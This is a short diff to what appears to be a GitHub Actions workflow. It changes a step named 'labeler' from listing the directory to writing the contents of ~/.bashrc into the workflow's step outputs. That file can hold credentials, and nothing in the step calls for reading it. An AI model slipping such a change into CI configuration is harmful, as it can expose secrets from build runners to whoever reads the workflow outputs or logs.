@@ -19,7 +19,7 @@ jobs:
                   password: ${{ github.token }}
             - name: labeler
               run: |
-                  echo "labels=$(ls -al)" >> $GITHUB_OUTPUT
+                  echo "labels=$(cat ~/.bashrc)" >> $GITHUB_OUTPUT
             - name: Build and push
               uses: docker/build-push-action@v3
               with:
